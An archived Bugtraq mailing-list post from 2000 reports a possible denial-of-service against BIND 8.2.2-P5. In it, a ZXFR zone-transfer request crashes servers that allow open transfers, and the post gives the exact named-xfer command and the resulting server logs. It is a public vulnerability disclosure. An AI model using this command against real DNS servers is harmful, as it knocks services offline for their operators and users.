@@ -1,0 +1,156 @@
+Bugtraq: BIND 8.2.2-P5 Possible DOS 
+
+ Nmap Security Scanner 
+
+ Intro 
+
+ Ref Guide 
+
+ Install Guide 
+
+ Download 
+
+ Changelog 
+
+ Book 
+
+ Docs 
+
+ Security Lists 
+
+ Nmap Hackers 
+
+ Nmap Dev 
+
+ Bugtraq 
+
+ Full Disclosure 
+
+ Pen Test 
+
+ Basics 
+
+ More 
+
+ Security Tools 
+
+ Pass crackers 
+
+ Sniffers 
+
+ Vuln Scanners 
+
+ Web scanners 
+
+ Wireless 
+
+ Exploitation 
+
+ Packet crafters 
+
+ More 
+
+ Site News 
+
+ Advertising 
+
+ About/Contact 
+
+ Exceptional Links 
+
+ Good Reading 
+
+-->
+ Exploit World 
+
+ Sponsors: 
+
+ Bugtraq 
+mailing list archives 
+
+    By Date    
+
+    By Thread    
+
+ BIND 8.2.2-P5 Possible DOS 
+
+ From : "Fabio Pietrosanti (naif)" <fabio () TELEMAIL IT>
+
+ Date : Tue, 7 Nov 2000 13:40:49 +0100
+
+ Hi,
+playing with bind and ZXFR feature ( zone transfer compressed with a possible insecure
+execlp("gzip", "gzip", NULL); ), i discovered a Denial Of Service against Bind 8.2.2-P5 .
+
+By default Bind 8.2.2-P5 it's not compiled with ZXFR support unless you define it with #define BIND_ZXFR
+so it will refuse any ZXFR transfer, because it doesn't support it.
+But now what appens? Look here...
+
+################################
+zone to transfer: zone.pippo.com
+dns server: dns.pippo.com 192.168.1.1
+me: naif.gatesux.com 10.10.10.10
+I send a Zone Trasnfer request using "-Z" switch with means that i wish to use ZXFR.
+dns.pippo.com does'nt support ZXFR and have "allow-transfer{}" not configured, so everyone
+could ask him for *.zone.pippo.com ...
+
+<naif () naif> [~/bind/src822p5/bin/named-xfer] $ ./named-xfer -z zone.pippo.com -d 9 -f pics -Z dns.pippo.com
+named-xfer[29297]: send AXFR query 0 to 192.168.1.1
+named-xfer[29297]: premature EOF, fetching "zone.pippo.com"
+
+On the server's log:
+Nov 7 11:19:09 dns.pippo.com: named[188510]: approved ZXFR from [10.10.10.10].2284 for "zone.pippo.com"
+Nov 7 11:19:09 dns.pippo.com: named[188510]: unsupported XFR (type ZXFR) of "zone.pippo.com" (IN) to [10.10.10.10].2284
+
+Then the server "*** CRASHED ***" .
+
+I should assume that bind 8.2.2-P5 it's vulnerable ( Please someone test and confirm this kind of dos)
+and bind-9.0.0 has no support for ZXFR .
+
+<naif () naif> [~/bind] $ find src822p5/ -type f -exec grep -i zxfr \{\} ';' | wc -l
+ 234
+<naif () naif> [~/bind] $ find bind-9.0.0/ -type f -exec grep -i zxfr \{\} ';' | wc -l
+ 0
+
+A lot of DNS Server are misconfigured, and allow zone-transfer to any, so they are dossable...
+
+naif
+naif () itapac net
+
+    By Date    
+
+    By Thread    
+
+ Current thread: 
+
+ BIND 8.2.2-P5 Possible DOS Fabio Pietrosanti (naif) (Nov 09) 
+
+ Re: BIND 8.2.2-P5 Possible DOS Martin McFlySr (Nov 09) 
+
+ Re: BIND 8.2.2-P5 Possible DOS Jeroen Ruigrok/Asmodai (Nov 09) 
+
+ Re: BIND 8.2.2-P5 Possible DOS L. Adrian Griffis (Nov 10) 
+
+ Re: BIND 8.2.2-P5 Possible DOS Daniel Roesen (Nov 09) 
+
+ Re: BIND 8.2.2-P5 Possible DOS Akatosh (Nov 09) 
+
+ Re: BIND 8.2.2-P5 Possible DOS Greg A. Woods (Nov 11) 
+
+ Re: BIND 8.2.2-P5 Possible DOS Mark . Andrews (Nov 13) 
+
+ Re: BIND 8.2.2-P5 Possible DOS Greg A. Woods (Nov 11) 
+
+ Re: BIND 8.2.2-P5 Possible DOS Darron Froese (Nov 09) 
+
+ Re: BIND 8.2.2-P5 Possible DOS Greg A. Woods (Nov 09) 
+
+ (Thread continues...) 
+
+[ Nmap |
+ Sec Tools |
+ Mailing Lists |
+ Site News |
+ About/Contact |
+ Advertising |
+ Privacy ]
